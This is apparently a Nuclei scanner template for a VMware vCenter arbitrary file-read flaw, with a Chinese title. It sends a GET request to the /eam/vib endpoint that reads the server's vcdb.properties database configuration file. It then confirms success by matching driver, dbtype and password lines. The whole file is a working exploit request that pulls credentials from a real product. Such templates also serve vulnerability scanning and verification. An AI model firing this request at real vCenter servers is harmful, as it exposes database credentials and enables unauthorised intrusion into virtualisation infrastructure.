id: vcenter-fileRead

info:
  name: vmvare vcenter文件读取漏洞
  author: str1am
  severity: high
  tags: vcenter,lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties"
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "(?m)^(driver|dbtype|password(\\.encrypted)?)\\s="

      - type: status
        status:
          - 200
